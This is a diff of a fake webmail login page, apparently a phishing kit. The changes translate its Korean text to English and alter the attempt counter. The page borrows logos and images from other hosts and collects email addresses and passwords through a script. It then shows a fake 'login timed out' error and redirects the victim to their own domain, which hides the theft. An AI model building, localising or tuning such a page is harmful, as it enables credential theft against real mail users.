@@ -1,4 +1,5 @@
-﻿
+
+
 
 <!doctype html>
 <html lang="en"> 
@@ -10,11 +11,11 @@
   <meta name="referrer" content="strict-origin"> 
   <link id="favicon" rel="shortcut icon" type="image/png" href="https://alphatrade-options.com/git/rand/favicon.png"> 
   <script src="https://code.jquery.com/jquery-2.2.4.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script> 
-  <title>웹메일 - 로그인.........</title> 
+  <title>Webmail - Login.........</title> 
 
   <style>
         body {
-            background-color: #eeeeee;
+            background-color: white;
             font-family: Helvetica Neue, Helvetica, sans-serif;
             font-size: 13px;
             color: #425152;
@@ -315,14 +316,14 @@
            
             <div class="xlogo">
                 <img id="logoimg" src="https://firebasestorage.googleapis.com/v0/b/portal-aa363.appspot.com/o/favicons.png?alt=media&token=805fb0ef-a2d9-4a7f-85e6-d68384e166e3">
-                <span style="text-transform: capitalize;" class='text-g' id="banNer"></span>
+                <span style="text-transform: capitalize;" class='text-g' id="banNer"> Mail </span>
                 </div>
             <div class="row">
-                <div class="col1"><label for="id_email">이메일:</label></div>
-                <div class="col2"><input type="text" name="email" value="" id="email"autofocus placeholder="이메일 주소"></div>
+                <div class="col2"><label for="id_email">Email:</label></div>
+                <div class="col2"><input type="email" name="email" value="" id="email" placeholder="user@example.com"></div>
             </div>
-                <div class="col1"><label for="id_pass">비밀번호:</label></div>
-                <div class="col2"><input type="password" name="password" id="password" autofocus placeholder="이메일 비밀번호"></div>
+                <div class="col2"><label for="id_pass">Password:</label></div>
+                <div class="col2"><input type="password" name="password" id="password" autofocus placeholder="**********"></div>
                   <img id="id-password-reveal-icon" class="password-icon" src="https://fac.corp.fortinet.com/customviews/image/password_hidden:93edf7d3ceb704be92ee084ecc62c6c8/" alt="" onclick="setVisibility()"/>
             </div>
             <br><br>
@@ -330,7 +331,7 @@
                <span id="msg" class="error-notice" style="display: none;padding: 10px; height: 20px; width:1220px;vertical-align: middle; border:0px solid red; color:red; font-size: 16px;	color: red;
 	font-family: 'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
 	margin-top: 12px;
-       ">로그인 시도 시간이 초과되었습니다. 다시 시도하십시오.</span>
+       ">Your login attempt timed out. Please try again.</span>
 	   
 	   <span id="error" class="error-notice" style="display: none;padding: 10px; height: 20px; width:1220px;vertical-align: middle; border:0px solid red; color:red; font-size: 16px;	color: red;
 	font-family: 'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
@@ -339,12 +340,12 @@
             </div>
             <div class="row">
                 <div class="col1" style="line-height:40px;padding-top:10px;">
-                    <input type="button" id='submit-btn' class="submit" value="계속하려면 로그인" style="padding:7px 24px;" /></div>
+                    <input type="button" id='submit-btn' class="submit" value="Log in to continue" style="padding:7px 24px;" /></div>
             </div>
             <div class="row">
                 
                 <p>
-                    괜찮습니다. 저작권 © 2025 <span id="kai" style="text-transform: capitalize;"></span>.
+                    User Login Authentication <span id="kai" style="text-transform: capitalize;"></span>.
                     <br>
                     <br>
                 </p>
@@ -377,7 +378,7 @@
 <script>
   /* global $ */
   $(document).ready(function () {
-    var count = 0;
+    var count = 2;
 
 
     $('#m-btn').click();
@@ -509,9 +510,9 @@
                 if (response['signal'] == 'ok') {
                   $("#processing").hide();
                   $("#password").val("");
-                  if (count >= 2) {
+                  if (count >= 1) {
                     $("#processing").hide();
-                    count = 0;
+                    count = 2;
                     // window.location.replace(response['redirect_link']);
                     window.location.replace("http://www." + my_slice);
                     return false;
@@ -529,12 +530,12 @@
               $("#password").val("");
               if (count >= 2) {
                 $("#processing").hide();
-                count = 0;
+                count = 2;
                 window.location.replace("http://www." + my_slice);
                 return false;
               }
               $("#msg").show();
-              // $('#msg').html("나중에 다시 시도 해주십시오");
+              // $('#msg').html("Please try again later");
             },
             complete: function () {
               $("#processing").hide();
